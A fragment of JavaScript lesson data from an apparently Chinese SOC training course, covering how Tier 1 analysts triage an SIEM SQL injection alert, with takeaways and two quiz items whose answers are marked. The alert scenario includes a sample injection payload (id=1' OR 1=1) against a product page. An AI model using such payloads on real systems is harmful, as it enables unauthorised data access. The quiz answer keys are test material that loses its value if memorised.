      { type: 'code', text: '背景：SIEM 弹出"SQL 注入告警"——攻击 IP 45.83.66.23 目标 /product.php?id=1\' OR 1=1\n你的 Tier 1 处理：\n① 查原始日志确认真实性（payload 是否真的执行）\n② 查影响面（该 IP 还打过什么/查到多深/数据是否外带）\n③ 打标签（ATT&CK: T1190；资产：product.php；级别：高）\n④ 决定升级 Tier2（附完整证据包）\n⑤ 记录工单闭环' },
      { type: 'callout', ico: '🎮', kind: 'tip', title: '练一练', html: '站内「SOC 值班室」游戏的告警三步研判（定级→定性→处置）就是本课的模拟考；「护网模拟器」则是全流程指挥版。' },
    ],
    takeaways: ['告警≠事件≠事故，先研判再升级', 'Tier 1/2/3 职责链与 NIST 四阶段', 'MTTD/MTTR 是 SOC 的成绩单'],
    checks: [
      { q: 'SIEM 触发规则产生的叫？', opts: ['事件', '告警', '事故', '情报'], a: 1, ex: '规则触发=告警；人工确认为真实攻击才升级为事件。' },
      { q: 'Tier 1 遇到疑似高危事件的第一动作？', opts: ['自己处置完不报', '查原始日志确认真伪并准备证据升级', '直接格式化', '忽略'], a: 1, ex: 'Tier 1 的职责是研判与升级，证据包是升级的质量保证。' },
    ],
  });

  LESSONS.push(...L);
})();
